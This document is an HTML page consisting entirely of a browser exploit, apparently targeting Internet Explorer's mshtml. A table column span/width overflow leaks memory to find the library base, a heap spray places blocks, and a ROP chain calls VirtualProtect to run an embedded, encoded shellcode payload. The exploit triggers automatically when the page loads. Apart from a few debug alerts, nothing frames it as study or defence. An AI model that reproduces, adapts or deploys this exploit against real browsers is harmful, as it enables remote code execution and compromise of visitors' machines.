<html>
<body>
<div id="fun"></div>
<div id="button_container"></div>
<table style="table-layout:fixed" >
    <col id="132" width="41" span="9" >&nbsp </col>
</table>
<script>
    rop_chain = 0
    shellcode_address = 0
    safety = 0
    base = 0

    var shellcode = unescape("%uec83%u9064%u98b8%u5528%uda45%ud9c9%u2474%u31f4%ub1c9%u5b33%u4331%u8313%ufceb%u4303%uca97%ub9a0%u834f%u424b%uf48f%ua7c2%u26be%uacb0%uf692%ue1b2%u7c1e%u1196%uf095%u153f%ube1e%u1819%u0e9f%uf6a6%u1063%u055a%uf2b7%uc663%uf3ca%u3ba4%ua124%u377d%u5696%u0509%u562a%u01dd%u2012%ud558%u9ae6%u0663%u9056%ube2c%ufedd%ubf8c%u1d32%uf6f0%ud63f%u0882%u26e9%u3b6a%ue5d5%uf355%uf4d8%u3492%u8302%u46e8%u94bf%u342a%u101b%u9eaf%u82e8%u1e0b%u543d%u2cdf%u128a%u3087%uf60d%u4db3%uf986%uc413%udddc%u8cb7%u7c87%u68e1%u8066%ud5f1%u24d7%uf779%u5e0c%u9220%ud2d3%udb5e%uecd3%u4c60%uddbb%u03eb%ue1bc%u6039%ua832%uc160%u75da%u53f1%u8587%u972f%u05b1%u68da%u1546%u6daf%u9103%u1c43%u741c%ub364%u5d1d%u5207%u3d8d%uf1e6%ua735%uf3f6");

    var div_container = document.getElementById("button_container");
    div_container.style.cssText = "display:none";

    free_block = new Array();
    a_block = new Array();
    b_block = new Array();

    function pack(string){
        var str = string.toString(16)
        while(str.length < 8){
            var x = "0"
            x += str;
            str = x;
        }
        var chunks = []
        var chunksize = 4;

        while (str){
            if(str.length < chunksize) {
                chunks.push(str)
                break;
            }
            else {
                chunks.push(str.substr(0,chunksize))
                str = str.substr(chunksize)
            }
        }
        return  unescape("%u" + chunks[1] + "%u" + chunks[0])
    }

    //Easily create strings of certain length Easier to use for filler then makestring
    function fill(iter,fill)
    {
        var s = "";
        var count = 0;
        do {
            s += fill;
            count += 1;
        } while (count < iter);

        return s;
    }

    function vprotect_wrapper(){
        str  =  pack(shellcode_address)// return address to location of shellcode
        str +=  pack(shellcode_address-500) // address to start virtual protect
        str +=  pack(0x9999) // size of protect call
        str +=  pack(0x40) // new protect privelege 0x40 read write execute not 0x10 lol
        str +=  pack(shellcode_address-1000) // old protect not used... garbage
        return str;
    }

    function calc(offset){
        return pack( base + offset )
    }


    rop =  calc(0x29e1)    // pop ebx pop ebp ret           : 5b5dc3
    rop += pack(0xdead0000)// Specific to overflow exploit usually start at xchg
    rop += calc(0x117ef)   // xchg eax, esp ret             : 94c3
    rop += calc(0x1148d)   // pop     eax                   : 58c3
    rop += calc(0x1308)    // IAT pointer to vprotect
    rop += calc(0x9f5c9)   // mov     eax,dword ptr [eax]   : 8b00 
    rop += calc(0x2d7fe)   // push    eax                   : 50c3
    rop += vprotect_wrapper(); // pushing arguments for vprotect

    function strtoint(str) {
        return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);
    }

    function first_Rop(){
        rop = calc(0x1148d)   // pop     eax                   : 58c3
        rop += pack(safety)
        rop += calc(0x117ef)
        return rop
    }
  
    function final_rop(){
        rop = calc(0x1148d)   // pop     eax                   : 58c3
        rop += calc(0x1308)    // IAT pointer to vprotect
        rop += calc(0x9f5c9)   // mov     eax,dword ptr [eax]   : 8b00 
        rop += calc(0x2d7fe)   // push    eax                   : 50c3
        rop += vprotect_wrapper(); // pushing arguments for vprotect
        return rop
    }

    function heap_set(){
        var free = fill(125, "F");
        var string1 = fill(125, "A")
        var string2 = fill(125, "B")
       
        for (var i=0; i < 500; i+=2) {
                free_block[i] = free.substring(0, 125); //SIZE FC ALLOCATED BLOCK SIZE 
                a_block[i] = string1.substring(0, 125);
                b_block[i] = string2.substring(0, 125);
                var obj = document.createElement("button");
                div_container.appendChild(obj);
        }
         
        //free the first string in every block set
        for (var i= 0; i<500; i+=2 ) {
                free_block[i] = null;
        } 
        CollectGarbage();
    }
 
    function get_leak(){
     //free the first string in every block set
        for (var i= 300; i<400; i+=2 ) {
                a_block[i] = null;
        } 
        CollectGarbage();

        readindex = -1;
        for(var i=0; i < 500; i+=2) {
           if(b_block[0].substring(2,b_block[0].length-2)!=b_block[i].substring(2,b_block[0].length-2)) {
              readindex = i;
              break;
           }
        }

        if(readindex == -1) {
           alert("Error overwriring first spray");
           return 0;
        }

        //Free blocks around the b buffer to ensure our allocations are accessible
        for (var i= 300; i<400; i+=2 ) {
            if(i != readindex){
                b_block[i] = null;
                a_block[i] = null;
            }
        } 
        CollectGarbage();

        //Get values from infromation leak
        base = strtoint(b_block[readindex].substring(136, 140)) - 1522832; //base of mshtml
        block_base = strtoint(b_block[readindex].substring(204,208)) // cbutton block
        buffer = block_base-968 //vulnerable buffer in memory
        bs = buffer + 0x20c // b block which we overwrote the length param with
        x = b_block[readindex].length

        /****

        3 blocks each 125 in length to ensure they fill spots accesible by the info leak

        shellcode block goes first because it does not need to know where it is in memory
        next goes the rop block with the shellcode address passed into virtual protect
        lastly a trampoline block goes with the address of the rop block. Trampoline is just repetitive rop chain trying to jump
        to rop block. Not perfect probably a more solid way to do this.

        ***/

        //Block to hold shellcode 
        shell2 = pack(0x5a5b5c5d)
        shell2 += shellcode
        shell2 += fill(50, "\u9090\u9090")
        shell_block = shell2.substring(0,125)
        j = 0
        while(j+4 < x){
           if(strtoint(b_block[readindex].substring(j, j+4)) == 0x5a5b5c5d){
                 shellcode_address = j //strtoint(b_block[readindex].substring(j, j+4))
           }
           j += 4
        }
        if(shellcode_address == 0){
            alert("NO SHELLCODE ")
            return
        }
        shellcode_address = bs + shellcode_address*2 + 12


        //block to hold rop and return to shellcode
        cops2 = pack(0x55565758)
        cops2 += final_rop()
        cops2 += fill(500, "\u9090\u9090")
        cop_block3  = cops2.substring(0,125)
         j = 0
         while(j+4 < x*2){
           if(strtoint(b_block[readindex].substring(j, j+4)) == 0x55565758){
                 safety = j //strtoint(b_block[readindex].substring(j, j+4))
           }
           j += 4
        }
        if(safety == 0){
            alert("NO SAFETY ")
            return
        }
        safety =  bs + safety*2 + 12


        //block to jump to rop block 1 in 3 odds
        var pay = first_Rop();
        nops = pack(0x41424344)
        nops += pack(0xdead0000)
        nops += fill(150, pay )//"\ub9b9\uc9c9")
        nop_blo  = nops.substring(0,125)
        j = 0
        while(j+4 < x*2){
           if(strtoint(b_block[readindex].substring(j, j+4)) == 0x41424344){
                rop_chain = j 
            }
           j += 4
        }
        
        if (rop_chain == 0){
            alert("no rop")
            return
        }
        rop_chain = bs + rop_chain*2 + 12

        old_rop = rop_chain
        while(rop_chain % 100 != 0) rop_chain += 1;
        var div = Math.floor(rop_chain/100);
        rop_chain = div*100
        var filler = rop_chain-old_rop

        alert("BASE OF ROP = 0x" + old_rop.toString(16) + " LANDING = 0x" + rop_chain.toString(16) + " DIFFERENCE 0x" + filler.toString(16))

        y = ""+div
        var obj_col_0 = document.getElementById("132");
        obj_col_0.width = y;
        obj_col_0.span = "31";  

    }

    function leak(){
        var leak_col = document.getElementById("132");
        leak_col.width = "149";
        leak_col.span = "22";
    }

    heap_set();
    setTimeout(function(){leak()}, 400);
    setTimeout(function(){get_leak()},750);

</script>
</body>
</html>
